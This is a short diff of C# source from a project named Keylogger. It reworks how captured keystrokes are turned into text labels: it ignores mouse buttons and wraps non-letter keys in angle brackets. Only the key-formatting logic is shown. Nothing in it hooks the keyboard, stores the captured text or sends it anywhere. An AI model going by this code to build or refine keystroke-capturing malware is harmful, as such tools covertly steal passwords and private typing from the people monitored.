@@ -61,26 +61,19 @@ namespace Keylogger
                             else if (((Keys)keyCode) == Keys.Enter) { keyString = "\n"; }
                             else if (((Keys)keyCode) == Keys.Tab) { keyString = "\t"; }
 
-                            else if (((Keys)keyCode) == Keys.Back) { keyString = "<BACK>"; }
-                            else if (((Keys)keyCode) == Keys.Delete) { keyString = "<DELETE>"; }
+                            // Ignore the mouse buttons
+                            else if ((((Keys)keyCode) == Keys.LButton) || (((Keys)keyCode) == Keys.RButton)) { keyString = ""; }
 
-                            // Arrows
-                            else if (((Keys)keyCode) == Keys.Left) { keyString = "<LEFT>"; }
-                            else if (((Keys)keyCode) == Keys.Right) { keyString = "<RIGHT>"; }
-                            else if (((Keys)keyCode) == Keys.Up) { keyString = "<UP>"; }
-                            else if (((Keys)keyCode) == Keys.Down) { keyString = "<DOWN>"; }
-
-                            else if (keyCode >= 112 && keyCode <= 123)
-                            {
-                                keyString = "<" + ((Keys)keyCode).ToString() + ">";
-                            }
                             else if (keyCode >= 96 && keyCode <= 105)
                             {
                                 keyString = ((Keys)keyCode).ToString().Substring(6);
                             }
+                            
+                            else if ((keyCode < 65 || keyCode > 90))
+                            {
+                                keyString = "<" + ((Keys)keyCode).ToString().ToUpper() + ">";
+                            }
 
-                            // Ignore the mouse buttons
-                            else if ((((Keys)keyCode) == Keys.LButton) || (((Keys)keyCode) == Keys.RButton)) { keyString = ""; } 
                             else
                             {
                                 keyString = ((Keys)keyCode).ToString(); // Convert from ASCII to STRING
